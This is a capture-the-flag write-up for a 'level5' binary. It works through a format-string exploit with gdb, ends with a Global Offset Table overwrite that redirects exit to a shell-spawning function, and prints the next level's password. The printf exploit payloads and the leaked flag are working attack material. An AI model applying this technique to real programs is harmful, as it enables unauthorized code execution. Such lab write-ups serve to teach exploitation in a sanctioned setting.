# Write up

Here again we have a `level5` binary with a format string to exploit.
This time, we have a `o` function which calls system, but this function is never call.
Since we can overwrite memory with the format string exploit, I will try to overwrite this instruction :
```
 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>
```
By a `jump 080484a4` instruction.
The jump opcode is `eb [8bit relative offset]`, which is 2 bytes long.

We do the hex offset calculation : `80484ff - 080484a4 = 5B`.
The relative offset is `FF - 5A = A5`.

So we'll try to inject 60325 (eba5 in hex) at the `80484ff` address.

With the placeholder payload : 
```
AAAA.%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
AAAA.200 b7fd1ac0 b7ff37d0 41414141 2078252e 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a 0 0
```
We get the exploitable address in 4th position.
We try this payload :
```
(printf "%b%s" "\xff\x84\x04\x08" "%60305d%x%x%n"; cat) | ./level5
```
However we get a segfault.

We debug it into gdb and notice that we have to write our instruction in little endian
```
(gdb) x 0x80484ff
0x80484ff <n+61>:     0xfffecce8
(gdb) set {int}0x80484ff=0x0000a5eb
(gdb) x 0x80484ff
0x80484ff <n+61>:     0x0000a5eb
(gdb) continue
Program received signal SIGSEGV, Segmentation fault.
0x080484a6 in o ()
```
Now the segfault occurs in the o function, we have to correct our offset and inject `0x0000a6eb`.
```
(gdb) set {int}0x80484ff=0x0000a6eb
(gdb) continue
Continuing.
test
test
$
```
Great ! We have our shell, now we have to execute this payload with printf, injecting 42731 at the 0x80484ff address.
```
(printf "%b%s" "\xff\x84\x04\x08" "%42711d%x%x%n"; cat) | ./level5
```
Sadly, we still get this strange segfault :
```
Program received signal SIGSEGV, Segmentation fault.
0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
```
With further research, it seems like the address here is non-writable and will not let us use this exploit, we have to find another method.

The first sourced site show us the Global Offset Table (GOT) exploit, since we have an exit call, we can try to overwrite it.
Using the `objdump -R level5` command, we get this line which interests us :
```
08049838 R_386_JUMP_SLOT   exit
```
We can access our shell within gdb setting the exit global pointer to the o function address :
```
(gdb) set {int}0x08049838=0x80484a4
```
Which leads us to a new payload :
```
(printf "%b%s" "\x38\x98\x04\x08" "%134513808d%x%x%n"; cat) | ./level5
```
Which gives us our shell and our flag
```
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## Sources

https://resources.infosecinstitute.com/exploiting-format-strings-getting-the-shell/#gref
https://security.stackexchange.com/questions/138088/segmentation-fault-trying-to-exploit-printf-vulnerability